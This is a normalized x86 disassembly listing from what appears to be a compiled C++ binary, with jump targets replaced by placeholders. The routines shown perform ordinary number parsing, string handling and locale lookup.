mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edx [ ebp - 0x64 ]
cmp [ eax + edx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_409a90
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi edi
mov dx [ ebp - 0x6c ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2b
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x68 ] 0x0
call sub_41f260
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebp - 0x50 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
mov dx [ ebp - 0x6c ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x80 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x54 ] 0x2d
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x1
mov [ ebx ] 0x0
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2d
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
movzx edx [ ebp - 0x6c ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp - 0x68 ] 0x8
jge r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ ebx + 0x6 ]
sub dl [ ebp - 0x6c ]
mov eax [ ebp - 0x58 ]
add dl 0x30
mov [ eax ] dl
inc eax
inc [ ebp - 0x68 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41ec60
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ esi + 0x6 ]
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x6 ] ax
mov [ esi + 0x4 ] 0x1
retn
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41ecc0
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
mov eax esi
retn
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x4 ] 0x0
mov eax esi
retn
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41ed20
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_435a79
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_405f00
test edi edi
je r-xdata
cmp edi 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov cl [ ebp + 0xc ]
mov eax esi
mov [ eax ] cl
jmp r-xdata
mov eax [ esi ]
mov cl [ ebp + 0xc ]
mov [ eax ] cl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
movsx edx [ ebp + 0xc ]
push edi
push edx
push eax
call sub_43a820
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_41ede0
push ebp
mov ebp esp
push 0xffffffff
push sub_451178
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_436188
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_436188
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_4361b0
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_435e5e
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_4361b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_41f1a0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_436188
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_437d0f
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_43c3a5
lea ecx [ ebp - 0x14 ]
call sub_4361b0
push esi
call sub_435de7
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_41ef20
push ebp
mov ebp esp
push 0xffffffff
push sub_4514d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
movzx edx [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x48 ] ecx
xor ebx ebx
mov esi 0x2
xor ecx ecx
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] esi
cmp dx bx
je r-xdata
push ebx
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_41ed20
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x34 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
lea esp [ esp ]
mov eax edx
lea ecx [ ecx ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
movzx eax [ edi + ebx * 2 ]
test ax ax
je r-xdata
movzx eax [ edi + ecx * 2 + 0x2 ]
inc ecx
cmp ax bx
jne r-xdata
inc esi
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov esi [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp esi 0x10
jae r-xdata
movzx ecx [ edi ]
nop
cmp ax dx
jne r-xdata
mov [ ebp - 0x40 ] esi
cmp [ eax + edx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ edi + ebx * 2 + 0x2 ]
inc ebx
test ax ax
jne r-xdata
mov ecx [ ebp - 0x38 ]
add ebx ecx
movzx eax [ edi + ebx * 2 ]
cmp ax [ edi ]
je r-xdata
mov eax [ ebp - 0x2c ]
cmp esi 0x10
jae r-xdata
cmp ax cx
je r-xdata
cmp ecx 0x7f
jb r-xdata
test ax ax
je r-xdata
movsx eax [ eax + edx ]
add ebx eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
cmp esi 0x10
jae r-xdata
mov ecx 0x7f
mov edi [ ebp - 0x48 ]
mov esi [ ebp - 0x44 ]
call sub_41f260
test al al
jne r-xdata
inc edx
mov [ ebp - 0x3c ] edx
cmp edx [ ebp - 0x40 ]
jb r-xdata
mov [ eax + edx ] cl
mov [ ebp - 0x34 ] edx
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
cmp ecx 0x7f
jb r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx 0x7f
mov edx [ ebp + 0xc ]
mov ax [ edx + ebx * 2 ]
cmp ax [ esi + 0x6 ]
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov edi [ ebp - 0x48 ]
mov esi [ ebp - 0x44 ]
call sub_41f260
test al al
jne r-xdata
mov edx [ ebp - 0x3c ]
mov edi [ ebp + 0xc ]
mov [ eax + edx ] cl
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edi edx
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov [ esi ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ esi ]
inc [ ebp - 0x38 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp + 0xc ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
xor edx edx
xor ebx ebx
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x3c ] edx
test esi esi
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp + 0xc ]
mov [ esi + 0x4 ] 0x0
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41f1a0
push ebp
mov ebp esp
push 0xffffffff
push sub_45130b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_4026b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_402600
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_435bc6
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_41f260
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov [ esi ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ edi ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ edi + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ esi + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ edi + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41f310
push ebp
mov ebp esp
push 0xffffffff
push sub_453a34
mov eax [ fs : 0x0 ]
push eax
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x104 ] esi
mov [ ebp - 0x108 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov ebx 0x7
mov [ ebp - 0xfc ] ax
push ebx
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x104 ] 0x1
mov [ ebp - 0x100 ] sub_41f630
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0xe0 ] cx
push 0x3b
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x3
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_41f770
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0xa4 ] ax
push 0x31
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x84 ] cx
push ebx
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_41f8b0
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x37
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x4c ] sub_41f9f0
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x5
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x22
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] cx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] ax
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
jb r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] cx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] ax
jb r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xfc ]
push ecx
call sub_43811c
add esp 0x4
sub_41f630
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453fe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
sub esp 0x1c
mov ecx esp
xor eax eax
xor ebx ebx
mov edi 0x7
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x2c ] esp
mov [ ecx ] ax
push 0x14
mov eax r--data
xor esi esi
call sub_401c90
sub esp 0x1c
mov [ esp + 0x60 ] ebx
mov ecx esp
mov [ esp + 0x4c ] esp
xor edx edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push 0x14
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ esp + 0x7c ] 0x1
xor eax eax
mov [ ecx + 0x14 ] edi
